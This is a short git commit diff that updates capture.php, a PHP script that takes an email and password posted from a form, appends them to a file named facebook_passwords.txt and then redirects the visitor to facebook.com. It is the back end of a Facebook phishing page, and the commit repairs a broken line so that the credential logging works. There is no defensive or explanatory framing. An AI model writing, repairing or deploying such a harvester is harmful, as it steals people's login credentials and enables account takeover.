ba83546c91c69a11e12d2155b8c770f82cffed70
Levon2000 <studyhard1588@gmail.com>
2025-03-18 23:48:31 +0400

    Update capture.php

--- capture.php
+++ capture.php
@@ -2,5 +2,5 @@
 
 
 <?php$email = $_POST['email'];$password = $_POST['password'];
-facebook_passwords.txt('credentials.txt',$email. ':'.$password. PHP_EOL, FILE_APPEND);
+file_put_contents('facebook_passwords.txt',$email. ':'.$password. PHP_EOL, FILE_APPEND);
 header('Location: https://www.facebook.com/');exit;?>
